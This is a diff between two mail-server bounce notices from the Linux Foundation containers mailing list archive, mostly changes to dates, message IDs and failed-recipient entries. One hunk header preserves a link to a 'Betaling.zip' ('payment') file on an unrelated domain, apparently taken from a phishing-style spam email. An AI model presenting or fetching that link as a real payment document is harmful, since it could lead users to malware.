@@ -1,9 +1,9 @@
 From: postmaster-noreply-FMRk+c35SBqonA0d6jMUrA@public.gmane.org
 Subject: Undelivered Mail Returned to Sender
-Date: Wed, 11 Apr 2012 10:36:26 +0200 (CEST)
-Message-ID: <20120411083626.BED4E208D@smtpsrv.playnet.it>
+Date: Wed, 11 Apr 2012 13:02:26 +0200 (CEST)
+Message-ID: <20120411110226.866D92C8A6@smtpsrv.playnet.it>
 Mime-Version: 1.0
-Content-Type: multipart/mixed; boundary="===============8836507296787507150=="
+Content-Type: multipart/mixed; boundary="===============0612924167698435706=="
 Return-path: <containers-bounces-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org>
 List-Unsubscribe: <https://lists.linuxfoundation.org/mailman/options/containers>,
 	<mailto:containers-request-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org?subject=unsubscribe>
@@ -19,13 +19,13 @@ List-Id: containers.vger.kernel.org
 
 This is a MIME-encapsulated message.
 
---===============8836507296787507150==
+--===============0612924167698435706==
 Content-Type: multipart/report; report-type=delivery-status;
-	boundary="9E1351FCF.1334133386/smtpsrv.playnet.it"
+	boundary="9E1351FCF.1334142146/smtpsrv.playnet.it"
 
 This is a MIME-encapsulated message.
 
---9E1351FCF.1334133386/smtpsrv.playnet.it
+--9E1351FCF.1334142146/smtpsrv.playnet.it
 Content-Description: Notification
 Content-Type: text/plain; charset=us-ascii
 
@@ -41,19 +41,10 @@ delete your own text from the attached returned message.
 
                    The mail system
 
-<cfkjigj-POR7iDaXXag@public.gmane.org>: host mail.recht.nl[213.206.93.149] said: 550 No such user
+<dkjigj-POR7iDaXXag@public.gmane.org>: host mail.recht.nl[213.206.93.149] said: 550 No such user
     (#5.1.1) (in reply to RCPT TO command)
 
-<claudia-POR7iDaXXag@public.gmane.org>: host mail.recht.nl[213.206.93.149] said: 550 No such user
-    (#5.1.1) (in reply to RCPT TO command)
-
-<dcarter-POR7iDaXXag@public.gmane.org>: host mail.recht.nl[213.206.93.149] said: 550 No such user
-    (#5.1.1) (in reply to RCPT TO command)
-
-<difiu-POR7iDaXXag@public.gmane.org>: host mail.recht.nl[213.206.93.149] said: 550 delivery denied
-    (in reply to RCPT TO command)
-
---9E1351FCF.1334133386/smtpsrv.playnet.it
+--9E1351FCF.1334142146/smtpsrv.playnet.it
 Content-Description: Delivery report
 Content-Type: message/delivery-status
 
@@ -62,35 +53,14 @@ X-Postfix-Queue-ID: 9E1351FCF
 X-Postfix-Sender: rfc822; containers-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org
 Arrival-Date: Wed, 11 Apr 2012 10:36:19 +0200 (CEST)
 
-Final-Recipient: rfc822; cfkjigj-POR7iDaXXag@public.gmane.org
-Original-Recipient: rfc822;cfkjigj-POR7iDaXXag@public.gmane.org
+Final-Recipient: rfc822; dkjigj-POR7iDaXXag@public.gmane.org
+Original-Recipient: rfc822;dkjigj-POR7iDaXXag@public.gmane.org
 Action: failed
 Status: 5.0.0
 Remote-MTA: dns; mail.recht.nl
 Diagnostic-Code: smtp; 550 No such user (#5.1.1)
 
-Final-Recipient: rfc822; claudia-POR7iDaXXag@public.gmane.org
-Original-Recipient: rfc822;claudia-POR7iDaXXag@public.gmane.org
-Action: failed
-Status: 5.0.0
-Remote-MTA: dns; mail.recht.nl
-Diagnostic-Code: smtp; 550 No such user (#5.1.1)
-
-Final-Recipient: rfc822; dcarter-POR7iDaXXag@public.gmane.org
-Original-Recipient: rfc822;dcarter-POR7iDaXXag@public.gmane.org
-Action: failed
-Status: 5.0.0
-Remote-MTA: dns; mail.recht.nl
-Diagnostic-Code: smtp; 550 No such user (#5.1.1)
-
-Final-Recipient: rfc822; difiu-POR7iDaXXag@public.gmane.org
-Original-Recipient: rfc822;difiu-POR7iDaXXag@public.gmane.org
-Action: failed
-Status: 5.0.0
-Remote-MTA: dns; mail.recht.nl
-Diagnostic-Code: smtp; 550 delivery denied
-
---9E1351FCF.1334133386/smtpsrv.playnet.it
+--9E1351FCF.1334142146/smtpsrv.playnet.it
 Content-Description: Undelivered Message
 Content-Type: message/rfc822
 
@@ -118,9 +88,9 @@ http://izmittravestileri.com/nlclienti/Betaling.zip
 
 
 
---9E1351FCF.1334133386/smtpsrv.playnet.it--
+--9E1351FCF.1334142146/smtpsrv.playnet.it--
 
---===============8836507296787507150==
+--===============0612924167698435706==
 Content-Type: text/plain; charset="us-ascii"
 MIME-Version: 1.0
 Content-Transfer-Encoding: 7bit
@@ -130,4 +100,4 @@ _______________________________________________
 Containers mailing list
 Containers-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org
 https://lists.linuxfoundation.org/mailman/listinfo/containers
---===============8836507296787507150==--
+--===============0612924167698435706==--
